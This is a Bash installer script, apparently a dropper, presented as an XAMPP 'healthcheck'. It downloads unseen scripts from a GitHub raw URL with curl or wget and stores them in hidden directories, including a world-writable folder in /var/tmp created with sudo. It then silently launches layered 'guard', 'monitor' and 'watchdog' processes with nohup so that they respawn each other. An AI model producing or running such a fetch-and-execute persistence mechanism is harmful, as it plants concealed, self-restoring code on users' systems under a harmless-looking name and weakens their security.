#!/bin/bash
# ============================================
# 설치 스크립트 (Hybrid: Lokal + GitHub Fallback)
# File: installation.sh
# ============================================

set -e

# ============================================
# 🔗 LINK GITHUB DI SINI (untuk fallback)
# ============================================
REPO_URL="https://raw.githubusercontent.com/basilbay80/Pw4/main"

# ============================================
# Warna
# ============================================
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
MAIN_DIR="$HOME/.xampp-healthcheck"
HELPER_DIR="/tmp/.xampp-helper"
GUARD_DIR="/var/tmp/.xampp-guard"

info()    { echo -e "${BLUE}[INFO]${NC} $1"; }
success() { echo -e "${GREEN}[  ✓ ]${NC} $1"; }
warn()    { echo -e "${YELLOW}[WARN]${NC} $1"; }
error()   { echo -e "${RED}[FAIL]${NC} $1"; }

# ============================================
# Fungsi: Dapatkan file (lokal dulu, kalau tidak ada download)
# ============================================
get_file() {
    local filename="$1"
    local local_path="$SCRIPT_DIR/$filename"
    local target_dir="$2"
    local target_path="$target_dir/$filename"
    
    # 1. Kalau sudah ada di target, skip
    if [ -f "$target_path" ]; then
        success "$filename sudah ada di $target_dir"
        chmod +x "$target_path"
        return 0
    fi
    
    # 2. Kalau ada di folder lokal (SCRIPT_DIR), copy
    if [ -f "$local_path" ]; then
        cp "$local_path" "$target_path"
        chmod +x "$target_path"
        success "$filename di-copy dari lokal"
        return 0
    fi
    
    # 3. Kalau tidak ada, DOWNLOAD dari GitHub
    warn "$filename tidak ada di lokal, download dari GitHub..."
    
    if command -v curl > /dev/null 2>&1; then
        if curl -fsSL -o "$target_path" "${REPO_URL}/${filename}"; then
            chmod +x "$target_path"
            success "$filename berhasil di-download"
            return 0
        fi
    fi
    
    if command -v wget > /dev/null 2>&1; then
        if wget -q -O "$target_path" "${REPO_URL}/${filename}"; then
            chmod +x "$target_path"
            success "$filename berhasil di-download (wget)"
            return 0
        fi
    fi
    
    error "GAGAL mendapatkan $filename"
    return 1
}

# ============================================
# 1. Buat folder
# ============================================
echo ""
echo -e "${YELLOW}━━━ [1/5] Buat Folder ━━━${NC}"
mkdir -p "$MAIN_DIR/logs"
mkdir -p "$HELPER_DIR"
sudo mkdir -p "$GUARD_DIR" 2>/dev/null && sudo chmod 777 "$GUARD_DIR" 2>/dev/null
success "Folder siap"

# ============================================
# 2. Ambil semua file (lokal atau GitHub)
# ============================================
echo ""
echo -e "${YELLOW}━━━ [2/5] Siapkan Semua Script ━━━${NC}"

get_file "watchdog.sh"        "$MAIN_DIR"
get_file "trigger-respawn.sh" "$MAIN_DIR"
get_file "trigger-auto.sh"    "$MAIN_DIR"
get_file "monitor.sh"         "$HELPER_DIR"
get_file "guard.sh"           "$GUARD_DIR"

# ============================================
# 3. Chmod +x semua
# ============================================
echo ""
echo -e "${YELLOW}━━━ [3/5] Chmod +x ━━━${NC}"
find "$MAIN_DIR"   -maxdepth 1 -type f -name "*.sh" -exec chmod +x {} \;
find "$HELPER_DIR" -maxdepth 1 -type f -name "*.sh" -exec chmod +x {} \;
find "$GUARD_DIR"  -maxdepth 1 -type f -name "*.sh" -exec chmod +x {} \;
success "Semua script executable"

# ============================================
# 4. Matikan proses lama
# ============================================
echo ""
echo -e "${YELLOW}━━━ [4/5] Bersihkan Proses Lama ━━━${NC}"
pkill -f "watchdog.sh"     2>/dev/null && warn "watchdog.sh lama dihentikan" || true
pkill -f "monitor.sh"      2>/dev/null && warn "monitor.sh lama dihentikan"  || true
pkill -f "guard.sh"        2>/dev/null && warn "guard.sh lama dihentikan"    || true
pkill -f "trigger-auto.sh" 2>/dev/null && warn "trigger-auto.sh lama dihentikan" || true
rm -f "$MAIN_DIR/.watchdog.pid" "$HELPER_DIR/.monitor.pid" "$GUARD_DIR/.guard.pid"
success "Bersih"

# ============================================
# 5. Jalankan semua layer
# ============================================
echo ""
echo -e "${YELLOW}━━━ [5/5] Jalankan Semua Layer ━━━${NC}"

nohup bash "$GUARD_DIR/guard.sh"              > /dev/null 2>&1 & success "가드 (3차)"
sleep 1
nohup bash "$HELPER_DIR/monitor.sh"           > /dev/null 2>&1 & success "모니터 (2차)"
sleep 1
nohup bash "$MAIN_DIR/watchdog.sh"            > /dev/null 2>&1 & success "워치독 (1차)"
sleep 1
nohup bash "$MAIN_DIR/trigger-auto.sh"        > /dev/null 2>&1 & success "자동 트리거"

echo ""
echo -e "${GREEN}╔════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║   ✅ INSTALASI SELESAI!                ║${NC}"
echo -e "${GREEN}╚════════════════════════════════════════╝${NC}"
echo ""
echo -e "${CYAN}Cek status:${NC}  ./xampp.sh status"
echo -e "${CYAN}Lihat log:${NC}   tail -f $MAIN_DIR/logs/watchdog.log"
echo ""